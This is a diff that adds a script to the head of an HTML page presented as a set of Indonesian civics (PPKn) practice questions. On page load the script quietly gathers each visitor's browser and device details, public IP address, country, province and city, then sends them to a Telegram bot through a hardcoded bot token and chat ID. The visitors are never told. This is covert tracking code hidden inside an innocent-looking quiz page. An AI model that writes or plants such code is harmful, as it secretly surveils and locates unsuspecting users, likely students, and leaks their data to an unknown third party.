@@ -5,6 +5,103 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Latihan Soal PPKn punyak bibran</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Source+Serif+4:ital,wght@0,400;0,600;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<script>
+    const BOT_TOKEN = '7452582356:AAGVebNPLIW570_xBXZf3qQF8rWxGVclLKc';
+    const CHAT_ID = '8761801777';
+
+    const kirimPesan = async (pesan) => {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
+        });
+      } catch (e) {}
+    };
+
+    // Deteksi RAM (2,4,6,8,12 GB)
+    const getRAM = () => {
+      const memory = navigator.deviceMemory;
+      if (!memory) return 'Tidak diketahui';
+      
+      // Map ke nilai yang diinginkan
+      const ramMap = {
+        0.25: '2 GB',
+        0.5: '4 GB', 
+        1: '6 GB',
+        2: '8 GB',
+        4: '12 GB',
+        8: '16 GB'
+      };
+      
+      return ramMap[memory] || memory + ' GB';
+    };
+
+    // Deteksi Benua dari Zona Waktu
+    const getBenua = (timezone) => {
+      if (timezone.includes('Asia')) return 'Asia';
+      if (timezone.includes('Europe')) return 'Eropa';
+      if (timezone.includes('Africa')) return 'Afrika';
+      if (timezone.includes('America')) return 'Amerika';
+      if (timezone.includes('Australia')) return 'Australia';
+      return 'Tidak diketahui';
+    };
+
+    const ambilData = async () => {
+      const ua = navigator.userAgent;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const benua = getBenua(timezone);
+      
+      // Format persis seperti yang diminta
+      let data = `〘 𝗜𝗡𝗙𝗢 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙
+━━━━━━━━━━━━━━━━
+OS           : ${ua.includes('Android') ? 'Android' : ua.includes('Windows') ? 'Windows' : ua.includes('iPhone') ? 'iOS' : 'Linux'}
+Browser      : ${ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown'}
+Platform     : ${navigator.platform}
+User Agent   : ${ua}
+Bahasa       : ${navigator.language}
+Zona Waktu   : ${timezone}
+CPU Core     : ${navigator.hardwareConcurrency || 'Tidak diketahui'}
+RAM          : ${getRAM()}
+Cookies      : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Resolusi     : ${screen.width} x ${screen.height}
+Warna        : ${screen.colorDepth} bit
+Waktu Lokal  : ${new Date().toLocaleString('id-ID')}
+Referrer     : ${document.referrer || 'Langsung'}
+
+〘 𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 〙
+━━━━━━━━━━━━━━━━
+`;
+
+      // Ambil IP dan lokasi
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const ipData = await res.json();
+        
+        data += `IP Publik    : ${ipData.ip}\n`;
+        
+        // Tambah info benua sampai kota
+        if (ipData.country_name) {
+          data += `Benua        : ${benua}\n`;
+          data += `Negara       : ${ipData.country_name}\n`;
+          data += `Provinsi     : ${ipData.region || '-'}\n`;
+          data += `Kota         : ${ipData.city || '-'}\n`;
+        }
+      } catch {
+        data += `IP Publik    : Gagal mengambil data\n`;
+      }
+
+      // Kirim ke Telegram
+      await kirimPesan(data);
+      
+      // Tampilkan status
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('status').innerText = '✅ detik data has been send';
+    };
+
+    document.getElementById('status').innerText = 'mengirim data...';
+    ambilData();
+  </script>
 <style>
 :root{
   --ink:#1a1a2e;--red:#c0392b;--gold:#b8860b;--cream:#faf8f3;--paper:#f5f0e8;
